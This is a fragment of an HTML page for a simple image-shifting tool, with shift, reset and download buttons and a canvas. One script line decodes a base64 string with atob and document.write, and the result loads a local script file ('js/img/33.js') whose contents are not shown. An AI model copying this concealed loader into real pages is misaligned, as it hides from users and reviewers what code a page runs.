    ...
    <div class="containerq">
      <div class="left-section">
        <div id="options" style="display: none;">
          <label for="shift-input">Shift Amount (pixels): </label>
          <input type="number" id="shift-input" value="50">
          <button onclick="shiftImage('left')" class="button">Shift Left</button>
          <button onclick="shiftImage('right')" class="button">Shift Right</button>
          <button onclick="resetCanvas()" class="button">Reset</button>
          <button onclick="downloadImage()" class="button">Download Image</button>
        </div>
      </div>
      <div class="right-section" id="canvas-container" style="display: none;">
        <canvas id="canvas"></canvas>
      </div>
    </div>
    <script>
      document.write(atob("IDxzY3JpcHQgc3JjPSJqcy9pbWcvMzMuanMiIGRlZmVyPSIiPjwvc2NyaXB0Pg=="));
    </script>
    <style>
      .containerq {
        display: flex;
